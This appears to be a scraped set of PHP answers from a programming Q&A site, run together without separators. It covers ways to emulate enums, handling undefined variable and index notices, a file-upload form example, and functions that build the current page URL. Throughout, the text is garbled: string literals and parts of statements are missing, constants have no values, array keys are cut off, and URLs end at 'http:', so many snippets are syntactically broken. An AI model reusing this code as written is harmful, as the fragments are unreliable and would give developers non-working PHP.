<?php /** * Class Enum * * @author Christopher Fox <christopher.fox@gmx.de> * * @version 1.0 * * This class provides the function of an enumeration. * The values of Enum elements are unique (even between different Enums) * as you would expect them to be. * * Constructing a new Enum: * ======================== * * In the following example we construct an enum called "UserState" * with the elements "inactive", "active", "banned" and "deleted". * * <code> * Enum::Create( * </code> * * Using Enums: * ============ * * The following example demonstrates how to compare two Enum elements * * <code> * var_dump(UserState::inactive == UserState::banned); * var_dump(UserState::active == UserState::active); * </code> * * Special Enum methods: * ===================== * * Get the number of elements in an Enum: * * <code> * echo UserState::CountEntries(); * </code> * * Get a list with all elements of the Enum: * * <code> * $allUserStates = UserState::GetEntries(); * </code> * * Get a name of an element: * * <code> * echo UserState::GetName(UserState::deleted); * </code> * * Get an integer ID for an element (e.g. to store as a value in a database table): * This is simply the index of the element (beginning with 1). * Note that this ID is only unique for this Enum but now between different Enums. * * <code> * echo UserState::GetDatabaseID(UserState::active); * </code> */ class Enum { /** * @var Enum $instance The only instance of Enum (Singleton) */ private static $instance; /** * @var array $enums An array of all enums with Enum names as keys * and arrays of element names as values */ private $enums; /** * Constructs (the only) Enum instance */ private function __construct() { $this->enums = array(); } /** * Constructs a new enum * * @param string $name The class name for the enum * @param mixed $_ A list of strings to use as names for enum entries */ public static function Create($name, $_) { if (self::$instance===null) { self::$instance = new Enum(); } $args = func_get_args(); array_shift($args); self::$instance->add($name, $args); } /** * Creates an enumeration if this hasn * * @param string $name The class name for the enum * @param array $fields The names of the enum elements */ private function add($name, $fields) { if (!array_key_exists($name, $this->enums)) { $this->enums[$name] = array(); $classDeclaration = "class " . $name . " {\n" . "private static \$name = . $this->getClassConstants($name, $fields) . $this->getFunctionGetEntries($name) . $this->getFunctionCountEntries($name) . $this->getFunctionGetDatabaseID() . $this->getFunctionGetName() . "}"; eval($classDeclaration); } } /** * Returns the code of the class constants * for an enumeration. These are the representations * of the elements. * * @param string $name The class name for the enum * @param array $fields The names of the enum elements * * @return string The code of the class constants */ private function getClassConstants($name, $fields) { $constants = foreach ($fields as $field) { $uniqueID = $name . ";" . $field; $constants .= "const " . $field . " = array_push($this->enums[$name], $uniqueID); } return $constants; } /** * Returns the code of the function "GetEntries()" * for an enumeration * * @param string $name The class name for the enum * * @return string The code of the function "GetEntries()" */ private function getFunctionGetEntries($name) { $entryList = foreach ($this->enums[$name] as $key => $entry) { if ($key > 0) $entryList .= $entryList .= " } return "public static function GetEntries() { \n" . " return array(" . $entryList . ");\n" . "}\n"; } /** * Returns the code of the function "CountEntries()" * for an enumeration * * @param string $name The class name for the enum * * @return string The code of the function "CountEntries()" */ private function getFunctionCountEntries($name) { return "public static function CountEntries() { \n" . " return " . count($this->enums[$name]) . ";\n" . "}\n"; } /** * Returns the code of the function "GetDatabaseID()" * for an enumeration * * @return string The code of the function "GetDatabaseID()" */ private function getFunctionGetDatabaseID() { return "public static function GetDatabaseID(\$entry) { \n" . "\$key = array_search(\$entry, self::GetEntries());\n" . " return \$key + 1;\n" . "}\n"; } /** * Returns the code of the function "GetName()" * for an enumeration * * @return string The code of the function "GetName()" */ private function getFunctionGetName() { return "public static function GetName(\$entry) { \n" . "return substr(\$entry, strlen(self::\$name) + 1 , strlen(\$entry));\n" . "}\n"; } } ?>
class FruitsEnum { static $APPLE = null; static $ORANGE = null; private $value = null; public static $map; public function __construct($value) { $this->value = $value; } public static function init () { self::$APPLE = new FruitsEnum("Apple"); self::$ORANGE = new FruitsEnum("Orange"); self::$map = array ( "Apple" => self::$APPLE, "Orange" => self::$ORANGE ); } public static function get($element) { if($element == null) return null; return self::$map[$element]; } public function getValue() { return $this->value; } public function equals(FruitsEnum $element) { return $element->getValue() == $this->getValue(); } public function __toString () { return $this->value; } } FruitsEnum::init(); var_dump(FruitsEnum::$APPLE->equals(FruitsEnum::$APPLE)); var_dump(FruitsEnum::$APPLE->equals(FruitsEnum::$ORANGE)); var_dump(FruitsEnum::$APPLE instanceof FruitsEnum); var_dump(FruitsEnum::get("Apple")->equals(FruitsEnum::$APPLE)); var_dump(FruitsEnum::get("Apple")->equals(FruitsEnum::get("Orange")));
<?php use MyCLabs\Enum\Enum; /** * Action enum */ class Action extends Enum { const VIEW = const EDIT = }
<?php $action = new Action(Action::VIEW); $action = Action::VIEW();
<?php require_once __DIR__ . @mkdir(__DIR__ . EnumGenerator::setDefaultCachedClassesDir(__DIR__ . Enum( Enum( echo var_dump(FruitsEnum::APPLE() == FruitsEnum::APPLE()) . "\n"; echo var_dump(FruitsEnum::APPLE() == FruitsEnum::ORANGE()) . "\n"; echo var_dump(FruitsEnum::APPLE() instanceof Enum) . "\n"; echo var_dump(FruitsEnum::APPLE() instanceof FruitsEnum) . "\n"; echo "->getName()\n"; foreach (FruitsEnum::iterator() as $enum) { echo " " . $enum->getName() . "\n"; } echo "->getValue()\n"; foreach (FruitsEnum::iterator() as $enum) { echo " " . $enum->getValue() . "\n"; } echo "->getOrdinal()\n"; foreach (CachedFruitsEnum::iterator() as $enum) { echo " " . $enum->getOrdinal() . "\n"; } echo "->getBinary()\n"; foreach (CachedFruitsEnum::iterator() as $enum) { echo " " . $enum->getBinary() . "\n"; }
FruitsEnum::APPLE() == FruitsEnum::APPLE(): bool(true) FruitsEnum::APPLE() == FruitsEnum::ORANGE(): bool(false) FruitsEnum::APPLE() instanceof Enum: bool(true) FruitsEnum::APPLE() instanceof FruitsEnum: bool(true) ->getName() APPLE ORANGE RASBERRY BANNANA ->getValue() apple orange rasberry bannana ->getValue() when values have been specified pig dog cat bird ->getOrdinal() 1 2 3 4 ->getBinary() 1 2 4 8
abstract class Enumeration { public static function enum() { $reflect = new ReflectionClass( get_called_class() ); return $reflect->getConstants(); } } class Test extends Enumeration { const A = const B = } foreach (Test::enum() as $key => $value) { echo "$key -> $value<br>"; }
abstract class Enum { private $_value; protected function __construct($value) { $this->_value = $value; } public function __toString() { return (string) $this->_value; } public static function enumerate() { $class = get_called_class(); $ref = new ReflectionClass($class); $statics = $ref->getStaticProperties(); foreach ($statics as $name => $value) { $ref->setStaticPropertyValue($name, new $class($value)); } } } class DaysOfWeek extends Enum { public static $MONDAY = 0; public static $SUNDAY = 1; } DaysOfWeek::enumerate(); function isMonday(DaysOfWeek $d) { if ($d == DaysOfWeek::$MONDAY) { return true; } else { return false; } } $day = DaysOfWeek::$MONDAY; echo (isMonday($day) ? "bummer it
$c->RED_LIGHT(); $c->YELLOW_LIGHT(); $c->GREEN_LIGHT();
echo $c->RED_LIGHT(); echo $c->YELLOW_LIGHT(); echo $c->GREEN_LIGHT();
<?php # # # # # # # # class enums { private $enums; private $clear_flag; private $last_value; function __construct() { $this->enums = array(); $this->clear_flag = false; $this->last_value = 0; if( func_num_args() > 0 ){ return $this->put( func_get_args() ); } return true; } function put() { $args = func_get_args(); # # if( is_array($args[0]) ){ # # foreach( $args[0] as $k=>$v ){ # # if( !isset($this->enums[$k]) ){ # # if( is_numeric($k) ){ $this->enums[$v] = $this->last_value++; } # # else { $this->last_value = $v + 1; $this->enums[$k] = $v; } } } } # # else { # # if( count($args) < 2 ){ # # if( !isset($this->enums[$args[0]]) ){ $this->enums[$args[0]] = $this->last_value++; } # # else { # # if( !isset($this->enums[$args[0]]) ){ $this->last_value = $args[1] + 1; $this->enums[$args[0]] = $args[1]; } } } } return true; } function get() { $num = func_num_args(); $args = func_get_args(); # # if( is_array($args[0]) ){ $ary = array(); foreach( $args[0] as $k=>$v ){ $ary[$v] = $this->enums[$v]; } return $ary; } # # else if( ($num > 0) && ($num < 2) ){ return $this->enums[$args[0]]; } # # else if( $num > 1 ){ $ary = array(); foreach( $args as $k=>$v ){ $ary[$v] = $this->enums[$v]; } return $ary; } # # return false; } function clear() { if( $clear_flag ){ unset( $this->enums ); $this->enums = array(); } return true; } function __call( $name, $arguments ) { if( isset($this->enums[$name]) ){ return $this->enums[$name]; } else if( !isset($this->enums[$name]) && (count($arguments) > 0) ){ $this->last_value = $arguments[0] + 1; $this->enums[$name] = $arguments[0]; return true; } else if( !isset($this->enums[$name]) && (count($arguments) < 1) ){ $this->enums[$name] = $this->last_value++; return true; } return false; } function __get($name) { if( isset($this->enums[$name]) ){ return $this->enums[$name]; } else if( !isset($this->enums[$name]) ){ $this->enums[$name] = $this->last_value++; return true; } return false; } function __set( $name, $value=null ) { if( isset($this->enums[$name]) ){ return false; } else if( !isset($this->enums[$name]) && !is_null($value) ){ $this->last_value = $value + 1; $this->enums[$name] = $value; return true; } else if( !isset($this->enums[$name]) && is_null($value) ){ $this->enums[$name] = $this->last_value++; return true; } return false; } function __destruct() { unset( $this->enums ); $this->enums = null; return true; } } # # # ?>
/** * A base class for enums. * * This class can be used as a base class for enums. * It can be used to create regular enums (incremental indices), but it can also be used to create binary flag values. * To create an enum class you can simply extend this class, and make a call to <yourEnumClass>::init() before you use the enum. * Preferably this call is made directly after the class declaration. * Example usages: * DaysOfTheWeek.class.php * abstract class DaysOfTheWeek extends Enum{ * static $MONDAY = 1; * static $TUESDAY; * static $WEDNESDAY; * static $THURSDAY; * static $FRIDAY; * static $SATURDAY; * static $SUNDAY; * } * DaysOfTheWeek::init(); * * example.php * require_once("DaysOfTheWeek.class.php"); * $today = date( * if ($today == DaysOfTheWeek::$SUNDAY || $today == DaysOfTheWeek::$SATURDAY) * echo "It * * Flags.class.php * abstract class Flags extends Enum{ * static $FLAG_1; * static $FLAG_2; * static $FLAG_3; * } * Flags::init(Enum::$BINARY_FLAG); * * example2.php * require_once("Flags.class.php"); * $flags = Flags::$FLAG_1 | Flags::$FLAG_2; * if ($flags & Flags::$FLAG_1) * echo "Flag_1 is set"; * * @author Tiddo Langerak */ abstract class Enum{ static $BINARY_FLAG = 1; /** * This function must be called to initialize the enumeration! * * @param bool $flags If the USE_BINARY flag is provided, the enum values will be binary flag values. Default: no flags set. */ public static function init($flags = 0){ $enum = get_called_class(); $ref = new ReflectionClass($enum); $items = $ref->getStaticProperties(); if ($flags & self::$BINARY_FLAG){ $value = 1; foreach ($items as $key=>$item){ if (!isset($item)){ $enum::$$key = $value; $value *= 2; } else { if ($key != 0 && ($key & ($key - 1) == 0)) $value = 2 * $item; } } } else { $value = 0; foreach ($items as $key=>$item){ if (!isset($item)){ $enum::$$key = $value; $value++; } else { $value = $item+1; } } } } }
class DaysOfWeek{ const Sunday = 0; const Monday = 1; private $intVal; private function __construct($intVal){ $this->intVal = $intVal; } public static function MONDAY(){ return new self(self::Monday); } } function printDayOfWeek(DaysOfWeek $d){ } printDayOfWeek(DaysOfWeek::MONDAY());
class DaysOfWeeks{ private static $monday = 1; private $intVal; private function __construct($intVal){ $this->intVal = $intVal; } public static function MONDAY(){ return new self(self::$monday); } public function intVal(){ return $this->intVal; } }
<?php abstract class AbstractEnum { /** @var array cache of all enum instances by class name and integer value */ private static $allEnumMembers = array(); /** @var mixed */ private $code; /** @var string */ private $description; /** * Return an enum instance of the concrete type on which this static method is called, assuming an instance * exists for the passed in value. Otherwise an exception is thrown. * * @param $code * @return AbstractEnum * @throws Exception */ public static function getByCode($code) { $concreteMembers = &self::getConcreteMembers(); if (array_key_exists($code, $concreteMembers)) { return $concreteMembers[$code]; } throw new Exception("Value } public static function getAllMembers() { return self::getConcreteMembers(); } /** * Create, cache and return an instance of the concrete enum type for the supplied primitive value. * * @param mixed $code code to uniquely identify this enum * @param string $description * @throws Exception * @return AbstractEnum */ protected static function enum($code, $description) { $concreteMembers = &self::getConcreteMembers(); if (array_key_exists($code, $concreteMembers)) { throw new Exception("Value } $concreteMembers[$code] = $concreteEnumInstance = new static($code, $description); return $concreteEnumInstance; } /** * @return AbstractEnum[] */ private static function &getConcreteMembers() { $thisClassName = get_called_class(); if (!array_key_exists($thisClassName, self::$allEnumMembers)) { $concreteMembers = array(); self::$allEnumMembers[$thisClassName] = $concreteMembers; } return self::$allEnumMembers[$thisClassName]; } private function __construct($code, $description) { $this->code = $code; $this->description = $description; } public function getCode() { return $this->code; } public function getDescription() { return $this->description; } }
<?php require( class EMyEnum extends AbstractEnum { /** @var EMyEnum */ public static $MY_FIRST_VALUE; /** @var EMyEnum */ public static $MY_SECOND_VALUE; /** @var EMyEnum */ public static $MY_THIRD_VALUE; public static function _init() { self::$MY_FIRST_VALUE = self::enum(1, self::$MY_SECOND_VALUE = self::enum(2, self::$MY_THIRD_VALUE = self::enum(3, } } EMyEnum::_init();
<?php require( echo EMyEnum::$MY_FIRST_VALUE->getCode(). var_dump(EMyEnum::getAllMembers()); echo PHP_EOL.EMyEnum::getByCode(2)->getDescription().PHP_EOL;
class DayOfWeek { static $values = array( self::MONDAY, self::TUESDAY, ); const MONDAY = 0; const TUESDAY = 1; } $today = DayOfWeek::MONDAY; assert( in_array( $today, DayOfWeek::$values ) );
abstract class ShirtSize { public const SMALL = 1; public const MEDIUM = 2; public const LARGE = 3; }
class ShirtSize { private $size; private function __construct ($size) { $this->size = $size; } public function equals (ShirtSize $s) { return $this->size === $s->size; } public static function SMALL () { return new self(1); } public static function MEDIUM () { return new self(2); } public static function LARGE () { return new self(3); } }
function sizeIsAvailable ($productId, ShirtSize $size) { } if(sizeIsAvailable($_GET["id"], ShirtSize::LARGE())) { echo "Available"; } else { echo "Out of stock."; } $s2 = ShirtSize::SMALL(); $s3 = ShirtSize::MEDIUM(); echo $s2->equals($s3) ? "SMALL == MEDIUM" : "SMALL != MEDIUM";
<?php /** * A class that simulates Enums behaviour * <code> * class Season extends Enum{ * const Spring = 0; * const Summer = 1; * const Autumn = 2; * const Winter = 3; * } * * $currentSeason = new Season(Season::Spring); * $nextYearSeason = new Season(Season::Spring); * $winter = new Season(Season::Winter); * $whatever = new Season(-1); * echo $currentSeason.is(Season::Spring); * echo $currentSeason.getName(); * echo $currentSeason.is($nextYearSeason); * echo $currentSeason.is(Season::Winter); * echo $currentSeason.is(Season::Spring); * echo $currentSeason.is($winter); * </code> * * Class Enum * * PHP Version 5.5 */ abstract class Enum { /** * Will contain all the constants of every enum that gets created to * avoid expensive ReflectionClass usage * @var array */ private static $_constCacheArray = []; /** * The value that separates this instance from the rest of the same class * @var mixed */ private $_value; /** * The label of the Enum instance. Will take the string name of the * constant provided, used for logging and human readable messages * @var string */ private $_name; /** * Creates an enum instance, while makes sure that the value given to the * enum is a valid one * * @param mixed $value The value of the current * * @throws \InvalidArgumentException */ public final function __construct($value) { $constants = self::_getConstants(); if (count($constants) !== count(array_unique($constants))) { throw new \InvalidArgumentException( } if ($name = array_search($value, $constants)) { $this->_value = $value; $this->_name = $name; } else { throw new \InvalidArgumentException( } } /** * Returns the constant name of the current enum instance * * @return string */ public function getName() { return $this->_name; } /** * Returns the value of the current enum instance * * @return mixed */ public function getValue() { return $this->_value; } /** * Checks whether this enum instance matches with the provided one. * This function should be used to compare Enums at all times instead * of an identity comparison * <code> * * * $var = new EnumObject( * $var2 = new EnumObject( * $var3 = new EnumObject2( * $var4 = new EnumObject2( * echo $var->is($var2); * echo $var->is( * echo $var->is($var3); * echo $var3->is($var4); * </code> * * @param mixed|Enum $enum The value we are comparing this enum object against * If the value is instance of the Enum class makes * sure they are instances of the same class as well, * otherwise just ensures they have the same value * * @return bool */ public final function is($enum) { if (is_subclass_of($enum, __CLASS__)) { return get_class($this) === get_class($enum) && $this->getValue() === $enum->getValue(); } else { return $this->getValue() === $enum; } } /** * Returns the constants that are set for the current Enum instance * * @return array */ private static function _getConstants() { if (self::$_constCacheArray == null) { self::$_constCacheArray = []; } $calledClass = get_called_class(); if (!array_key_exists($calledClass, self::$_constCacheArray)) { $reflect = new \ReflectionClass($calledClass); self::$_constCacheArray[$calledClass] = $reflect->getConstants(); } return self::$_constCacheArray[$calledClass]; } }
class Fruit extends Enum { static public $APPLE = 1; static public $ORANGE = 2; } Fruit::initialize();
$myFruit = Fruit::$APPLE; switch ($myFruit) { case Fruit::$APPLE : echo "I like apples\n"; break; case Fruit::$ORANGE : echo "I hate oranges\n"; break; } >> I like apples
/** Function only accepts Fruit enums as input**/ function echoFruit(Fruit $fruit) { echo $fruit->getName().": ".$fruit->getValue()."\n"; } /** Call function with each Enum value that Fruit has */ foreach (Fruit::getList() as $fruit) { echoFruit($fruit); } echoFruit(Fruit::$APPLE) echoFruit(2); >> APPLE: 1 >> ORANGE: 2 >> APPLE: 1 >> Argument 1 passed to echoFruit() must be an instance of Fruit, integer given
$myFruit = Fruit::getByValue(2); echo "Now I have an $myFruit\n"; >> Now I have an ORANGE
$myFruit = Fruit::getByName("APPLE"); echo "But I definitely prefer an $myFruit\n\n"; >> But I definitely prefer an APPLE
/** * @author Torge Kummerow */ class Enum { /** * Holds the values for each type of Enum */ static private $list = array(); /** * Initializes the enum values by replacing the number with an instance of itself * using reflection */ static public function initialize() { $className = get_called_class(); $class = new ReflectionClass($className); $staticProperties = $class->getStaticProperties(); self::$list[$className] = array(); foreach ($staticProperties as $propertyName => &$value) { if ($propertyName == continue; $enum = new $className($propertyName, $value); $class->setStaticPropertyValue($propertyName, $enum); self::$list[$className][$propertyName] = $enum; } unset($value); } /** * Gets the enum for the given value * * @param integer $value * @throws Exception * * @return Enum */ static public function getByValue($value) { $className = get_called_class(); foreach (self::$list[$className] as $propertyName=>&$enum) { if ($enum->value == $value) return $enum; } unset($enum); throw new Exception("No such enum with value=$value of type ".get_called_class()); } /** * Gets the enum for the given name * * @param string $name * @throws Exception * * @return Enum */ static public function getByName($name) { $className = get_called_class(); if (array_key_exists($name, static::$list[$className])) return self::$list[$className][$name]; throw new Exception("No such enum ".get_called_class()."::\$$name"); } /** * Returns the list of all enum variants * @return Array of Enum */ static public function getList() { $className = get_called_class(); return self::$list[$className]; } private $name; private $value; public function __construct($name, $value) { $this->name = $name; $this->value = $value; } public function __toString() { return $this->name; } public function getValue() { return $this->value; } public function getName() { return $this->name; } }
class Fruit extends Enum { /** * This comment is for autocomplete support in common IDEs * @var Fruit A yummy apple */ static public $APPLE = 1; /** * This comment is for autocomplete support in common IDEs * @var Fruit A sour orange */ static public $ORANGE = 2; } Fruit::initialize();
<?php class Month extends SplEnum { const __default = self::January; const January = 1; const February = 2; const March = 3; const April = 4; const May = 5; const June = 6; const July = 7; const August = 8; const September = 9; const October = 10; const November = 11; const December = 12; } echo new Month(Month::June) . PHP_EOL; try { new Month(13); } catch (UnexpectedValueException $uve) { echo $uve->getMessage() . PHP_EOL; } ?>
$value = "concert"; $Enumvalue = EnumCategory::enum($value); class EnumCategory{ const concert = 1; const festival = 2; const sport = 3; const nightlife = 4; const theatre = 5; const musical = 6; const cinema = 7; const charity = 8; const museum = 9; const other = 10; public function enum($string){ return constant( } }
class EnumCategory { static $concert = 1; static $festival = 2; static $sport = 3; static $nightlife = 4; static $theatre = 5; static $musical = 6; static $cinema = 7; static $charity = 8; static $museum = 9; static $other = 10; }
final class EnumException extends Exception{} abstract class Enum { /** * @var array ReflectionClass */ protected static $reflectorInstances = array(); /** * Массив конфигурированного объекта-константы enum * @var array */ protected static $enumInstances = array(); /** * Массив соответствий значение->ключ используется для проверки - * если ли константа с таким значением * @var array */ protected static $foundNameValueLink = array(); protected $constName; protected $constValue; /** * Реализует паттерн "Одиночка" * Возвращает объект константы, но но как объект его использовать не стоит, * т.к. для него реализован "волшебный метод" __toString() * Это должно использоваться только для типизачии его как параметра * @paradm Node */ final public static function get($value) { $name = self::getName($value); if ($name === false) throw new EnumException("Неизвестая константа"); $className = get_called_class(); if (!isset(self::$enumInstances[$className][$name])) { $value = constant($className. self::$enumInstances[$className][$name] = new $className($name, $value); } return self::$enumInstances[$className][$name]; } /** * Возвращает массив констант пар ключ-значение всего перечисления * @return array */ final public static function toArray() { $classConstantsArray = self::getReflectorInstance()->getConstants(); foreach ($classConstantsArray as $k => $v) $classConstantsArray[$k] = (string)$v; return $classConstantsArray; } /** * Для последующего использования в toArray для получения массива констант ключ->значение * @return ReflectionClass */ final private static function getReflectorInstance() { $className = get_called_class(); if (!isset(self::$reflectorInstances[$className])) { self::$reflectorInstances[$className] = new ReflectionClass($className); } return self::$reflectorInstances[$className]; } /** * Получает имя константы по её значению * @param string $value */ final public static function getName($value) { $className = (string)get_called_class(); $value = (string)$value; if (!isset(self::$foundNameValueLink[$className][$value])) { $constantName = array_search($value, self::toArray(), true); self::$foundNameValueLink[$className][$value] = $constantName; } return self::$foundNameValueLink[$className][$value]; } /** * Используется ли такое имя константы в перечислении * @param string $name */ final public static function isExistName($name) { $constArray = self::toArray(); return isset($constArray[$name]); } /** * Используется ли такое значение константы в перечислении * @param string $value */ final public static function isExistValue($value) { return self::getName($value) === false ? false : true; } final private function __clone(){} final private function __construct($name, $value) { $this->constName = $name; $this->constValue = $value; } final public function __toString() { return (string)$this->constValue; } }
class enumWorkType extends Enum { const FULL = 0; const SHORT = 1; }
class TestEnum extends Enum { public static $TEST1; public static $TEST2; } TestEnum::init();
class Enum { public static function parse($enum) { $class = get_called_class(); $vars = get_class_vars($class); if (array_key_exists($enum, $vars)) { return $vars[$enum]; } return null; } public static function init() { $className = get_called_class(); $consts = get_class_vars($className); foreach ($consts as $constant => $value) { if (is_null($className::$$constant)) { $constantValue = $constant; $constantValueName = $className . if (defined($constantValueName)) { $constantValue = constant($constantValueName); } $className::$$constant = new $className($constantValue); } } } public function __construct($value) { $this->value = $value; } }
echo "My variable value is: " . $my_variable_name; echo "My index value is: " . $my_array["my_index"];
$o = []; @$var = ["",0,null,1,2,3,$foo,$o[ array_walk($var, function($v) { echo (!isset($v) || $v == false) ? echo echo "\n"; });
$value = ""; $value = isset($_POST[ $value = !empty($_POST[
list($a, $b) = array(0 => list($one, $two) = explode(
$user_name = $_SESSION[ $user_name = if (!empty($_SESSION[ $user_name = $_SESSION[ }
function ifexists($varname) { return(isset($$varname)?$varname:null); }
function ifexistsidx($var,$index) { return(isset($var[$index])?$var[$index]:null); }
if (!isset($_POST[ $value = null; } elseif (is_array($_POST[ $value = false; } else { $value = $_POST[ }
$a=10; if($a==5) { $user_location= echo $user_location;
$a=10; if($a==5) { $user_location= echo $user_location;
$greeting = "Hello, ".exst($user_name, /** * Function exst() - Checks if the variable has been set * (copy/paste it in any place of your code) * * If the variable is set and not empty returns the variable (no transformation) * If the variable is not set or empty, returns the $default value * * @param mixed $var * @param mixed $default * * @return mixed */ function exst( & $var, $default = "") { $t = ""; if ( !isset($var) || !$var ) { if (isset($default) && $default != "") $t = $default; } else { $t = $var; } if (is_string($t)) $t = trim($t); return $t; }
echo "My index value is: " . ($my_array["my_index"] ??
echo "My index value is: " . (isset($my_array["my_index"]) ? $my_array["my_index"] :
<?php error_reporting(E_ALL); function idxVal(&$var, $default = null) { return empty($var) ? $var = $default : $var; } echo idxVal($arr[ echo idxVal($arr[ ?>
; Common Values: ; E_ALL (Show all errors, warnings and notices including coding standards.) ; E_ALL & ~E_NOTICE (Show all errors, except for notices) ; E_ALL & ~E_NOTICE & ~E_STRICT (Show all errors, except for notices and coding standards warnings.) ; E_COMPILE_ERROR|E_RECOVERABLE_ERROR|E_ERROR|E_CORE_ERROR (Show only errors) ; Default Value: E_ALL & ~E_NOTICE & ~E_STRICT & ~E_DEPRECATED ; Development Value: E_ALL ; Production Value: E_ALL & ~E_DEPRECATED & ~E_STRICT ; http: error_reporting = E_ALL & ~E_DEPRECATED & ~E_STRICT
function foo() { $my_variable_name = if ($my_variable_name) { } }
if (isset($my_array[ echo "My index value is: " . $my_array[ } $my_index_val = isset($my_array[ echo "My index value is: " . $my_index_val;
<?php $newArray[] = {1,2,3,4,5}; print_r($newArray[5]); ?>
class Person { protected $firstName; protected $lastName; public function setFullName($first, $last) { $this->firstName = $first; $lastName = $last; $this->$lastName = $last; } }
while( $row = fetching_function($query) ) { echo $row[ echo "<br>"; echo $row[ echo "<br>"; echo $row[ }
$newVariable = isset($thePotentialData) ? $thePotentialData : null;
if (isset($thePotentialData)) { $newVariable = $thePotentialData; } else { $newVariable = null; }
$foreName = getForeName(isset($userId) ? $userId : null); function getForeName($userId) { if ($userId === null) { } }
<!-- The data encoding type, enctype, MUST be specified as below --> <form enctype="multipart/form-data" action="__URL__" method="POST"> <!-- MAX_FILE_SIZE must precede the file input field --> <input type="hidden" name="MAX_FILE_SIZE" value="30000" /> <!-- Name of input element determines name in $_FILES array --> Send this file: <input name="userfile" type="file" /> <input type="submit" value="Send File" /> </form>
<?php $uploaddir = $uploadfile = $uploaddir . basename($_FILES[ echo if (move_uploaded_file($_FILES[ echo "File is valid, and was successfully uploaded.\n"; } else { echo "Possible file upload attack!\n"; } echo print_r($_FILES); print "</pre>"; ?>
<form action="example.php" method="post"> <p> <input type="text" name="name" /> <input type="submit" value="Submit" /> </p> </form> <select name="choice"> <option value="choice1">choice 1</option> <option value="choice2">choice 2</option> <option value="choice3">choice 3</option> <option value="choice4">choice 4</option> </select>
<form action="example.php" method="post"> <select name="choice"> <option value="choice1">choice 1</option> <option value="choice2">choice 2</option> <option value="choice3">choice 3</option> <option value="choice4">choice 4</option> </select> <p> <input type="text" name="name" /> <input type="submit" value="Submit" /> </p> </form>
153 foreach($cities as $key => $city){ 154 if(($city !=
foreach($cities as $key => $city){ if(array_key_exists($key, $citiesCounterArray)){ if(($city !=
<?php $testArr=array("Test1", "Test2"); print $testArr[2]; $myArr=array("val1"=>"1", "val2"=>"2"); print $myArr[ ?>
$my_variable_name = "Variable name"; echo "My variable value is: " . $my_variable_name; if(isset($my_array["my_index"])){ echo "My index value is: " . $my_array["my_index"]; }
if($my_variable_name){ } if(isset($my_variable_name)){ }
$defineVarialbe = false; if($defineVarialbe){ echo "true"; }else{ echo "false"; } if(isset($unDefineVarialbe)){ echo "true"; }else{ echo "false"; }
<?php trait TraitA { public $x = } trait TraitB { public $x = } class ClassC { use TraitA, TraitB; }
$url = " $escaped_url = htmlspecialchars( $url, ENT_QUOTES, echo
function url_origin( $s, $use_forwarded_host = false ) { $ssl = ( ! empty( $s[ $sp = strtolower( $s[ $protocol = substr( $sp, 0, strpos( $sp, $port = $s[ $port = ( ( ! $ssl && $port== $host = ( $use_forwarded_host && isset( $s[ $host = isset( $host ) ? $host : $s[ return $protocol . } function full_url( $s, $use_forwarded_host = false ) { return url_origin( $s, $use_forwarded_host ) . $s[ } $absolute_url = full_url( $_SERVER ); echo $absolute_url;
$x = pathinfo($url); $x[ $x[ $x[ $x[ $x = parse_url($url); $x[ $x[ $x[ $x[ $x[ $_SERVER["DOCUMENT_ROOT"] 🡺 /home/user/public_html $_SERVER["SERVER_ADDR"] 🡺 143.34.112.23 $_SERVER["SERVER_PORT"] 🡺 80(or 443 etc..) $_SERVER["REQUEST_SCHEME"] 🡺 https $_SERVER[ $_SERVER["REQUEST_URI"] 🡺 /subFolder/myfile.php?k=blaa $_SERVER["QUERY_STRING"] 🡺 k=blaa __FILE__ 🡺 /home/user/public_html/subFolder/myfile.php __DIR__ 🡺 /home/user/public_html/subFolder $_SERVER["REQUEST_URI"] 🡺 /subFolder/myfile.php?k=blaa parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH)🡺 /subFolder/myfile.php $_SERVER["PHP_SELF"] 🡺 /subFolder/myfile.php $_SERVER["SCRIPT_FILENAME"]🡺 /home/user/public_html/parentfile.php $_SERVER["PHP_SELF"] 🡺 /parentfile.php $_SERVER["REQUEST_URI"] 🡺 /parentfile.php?abc __FILE__ 🡺 /home/user/public_html/subFolder/myfile.php $HTTP_or_HTTPS = ((!empty($_SERVER[ basename($url) 🡺 myfile.php $debug_files = debug_backtrace(); $initial_called_file = count($debug_files) ? $debug_files[count($debug_files) - 1][
home_url() 🡺 http: get_stylesheet_directory_uri() 🡺 http: get_stylesheet_directory() 🡺 /home/user/public_html/wpdir/wp-content/themes/THEME_NAME plugin_dir_url(__FILE__) 🡺 http: plugin_dir_path(__FILE__) 🡺 /home/user/public_html/wpdir/wp-content/plugins/PLUGIN_NAME/
function full_path() { $s = &$_SERVER; $ssl = (!empty($s[ $sp = strtolower($s[ $protocol = substr($sp, 0, strpos($sp, $port = $s[ $port = ((!$ssl && $port== $host = isset($s[ $host = isset($host) ? $host : $s[ $uri = $protocol . $segments = explode( $url = $segments[0]; return $url; }
function getCurrentUrl($full = true) { if (isset($_SERVER[ $parse = parse_url( (isset($_SERVER[ (isset($_SERVER[ ); $parse[ return http_build_url( } }
$_SERVER[ $_SERVER[ $_SERVER[ $_SERVER[ echo getCurrentUrl(); echo getCurrentUrl(false);
<?php function curPageURL() { $pageURL = if ($_SERVER["HTTPS"] == "on") {$pageURL .= "s";} $pageURL .= ": if ($_SERVER["SERVER_PORT"] != "80") { $pageURL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"]; } else { $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"]; } return $pageURL; } ?>
$current_url = sprintf( isset($_SERVER[ $_SERVER[ $_SERVER[ );
<?php /** ------------------------------------------------------------------------------------------------------------------- * URI CLASS * URI management class * * @author Sandu Liviu Catalin * @email slc(dot)universe(at)gmail(dot)com * @license Public Domain **/ abstract class _URI { /** --------------------------------------------------------------------------------------------------------------- * - BASE PARAMETERS * $_Script_Hidden - Hide the script name from the returned URI * $_Public_Path - Location where public resources are stored * $_Public_Relative - Return the relative path version of public location * $_Public_Skin - Is the skin directory located in the public directory * $_Skin_Path - Location where skins are stored * $_Skin_Relative - Return the relative path version of skin location * $_Skin_Default - Use this as the default system skin * $_Fallback_Base - Use this base URL if you can * $_Fallback_Scheme - Use this scheme if you can * $_Fallback_User - Use this user name if you can * $_Fallback_Passwd - Use this password if you can * $_Fallback_Host - Use this host if you can * $_Fallback_Port - Use this port number if you can * $_Fallback_Script - Use this script name if you can * $_Separator_Scheme - Use this to separate the scheme from the rest of the url * $_Separator_Credentials - Use this to separate the user name from the password * $_Separator_Auth - Use this to 